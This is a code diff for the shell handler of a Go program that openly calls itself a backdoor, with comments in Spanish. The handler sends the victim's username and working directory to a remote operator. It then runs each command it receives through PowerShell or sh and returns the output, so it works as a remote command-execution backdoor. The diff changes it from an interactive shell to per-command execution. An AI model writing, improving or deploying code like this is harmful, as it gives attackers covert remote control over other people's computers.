@@ -2,12 +2,11 @@ package handler
 
 import (
 	"backdoor/transport"
-	"bufio"
 	"fmt"
-	"io"
 	"os"
 	"os/exec"
 	"runtime"
+	"strings"
 )
 
 func ShellHandler(t transport.Transport) {
@@ -18,50 +17,40 @@ func ShellHandler(t transport.Transport) {
 
 	cwd, _ := os.Getwd()
 	header := fmt.Sprintf("[*] Usuario: %s\n[*] Directorio: %s\n", username, cwd)
-	t.Write([]byte(header))
+	t.Write([]byte(header + "\r\n"))
 
-	var shell *exec.Cmd
+	var shellPath string
+	var shellArgs []string
 	if runtime.GOOS == "windows" {
-		shell = exec.Command("powershell.exe", "-NoLogo")
+		shellPath = "powershell.exe"
+		shellArgs = []string{"-NoLogo", "-Command"}
 	} else {
-		shell = exec.Command("sh")
+		shellPath = "sh"
+		shellArgs = []string{"-c"}
 	}
 
-	stdin, _ := shell.StdinPipe()
-	stdout, _ := shell.StdoutPipe()
-	stderr, _ := shell.StderrPipe()
-
-	err := shell.Start()
-	if err != nil {
-		t.Write([]byte(fmt.Sprintf("Error iniciando shell: %v\n", err)))
-		return
-	}
-
-	// Lee la salida del proceso
-	go func() {
-		reader := bufio.NewReader(io.MultiReader(stdout, stderr))
-		buf := make([]byte, 1024)
-		for {
-			n, err := reader.Read(buf)
-			if err != nil {
-				break
-			}
-			if n > 0 {
-				t.Write(buf[:n])
-			}
-		}
-	}()
-
-	// Envía comandos al stdin
 	for {
 		input, err := t.Read()
 		if err != nil {
 			break
 		}
-		if string(input) == "exit\n" || string(input) == "exit\r\n" {
-			stdin.Write([]byte("exit\n"))
+
+		cmdStr := strings.TrimSpace(string(input))
+		if cmdStr == "exit" {
 			break
 		}
-		stdin.Write(input)
+
+		cmd := exec.Command(shellPath, append(shellArgs, cmdStr)...)
+		output, err := cmd.CombinedOutput()
+
+		finalOutput := string(output)
+		if err != nil {
+			finalOutput += fmt.Sprintf("\n[!] Error al ejecutar el comando: %v", err)
+		}
+
+		// Normaliza saltos de línea
+		finalOutput = strings.ReplaceAll(finalOutput, "\n", "\r\n")
+
+		t.Write([]byte(finalOutput + "\r\n"))
 	}
 }
